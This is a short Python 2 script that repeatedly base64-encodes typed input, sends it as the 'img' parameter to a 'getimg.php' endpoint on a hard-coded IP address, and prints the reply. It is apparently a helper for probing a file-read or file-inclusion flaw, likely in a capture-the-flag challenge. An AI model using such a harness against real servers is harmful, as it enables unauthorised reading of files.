import requests,base64

r=requests.Session()
while(True):
	x=raw_input("input : ")
	x=base64.b64encode(x)
	print "http://3.91.17.218/getimg.php?img="+x
	print r.get("http://3.91.17.218/getimg.php?img="+x).text[:-1]